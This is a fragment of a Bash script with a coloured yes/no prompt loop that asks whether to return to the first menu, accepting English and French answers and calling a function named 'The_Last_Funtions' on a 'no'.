   while [ "$re" != 'Y' ] && [ "$re" != 'y' ] && [ "$re" != 'Yes' ] && [ "$re" != 'YES' ] && [ "$re" != 'yes' ] && [ "$re" != 'N' ] && [ "$re" != 'n' ] && [ "$re" != 'No' ] && [ "$re" != 'NO' ] && [ "$re" != 'no' ] && [ "$re" != 'O' ] && [ "$re" != 'o' ] && [ "$re" != 'Oui' ] && [ "$re" != 'OUI' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
         do
           echo -n -e "$Red   [!]$BBlue Do you want$BRed go to the first $BBlue menu $BCyan Y $BYellow or $BCyan N:$BGreen "
           read re
if [ $re = N ]
then
The_Last_Funtions
fi
if [ $re = n ]
then
The_Last_Funtions
fi
if [ $re = No ]
then
The_Last_Funtions
fi
if  [ $re = NO ]  
then
The_Last_Funtions
fi

if  [ $re = no ]
then
The_Last_Funtions
fi
           echo ""
   done
done

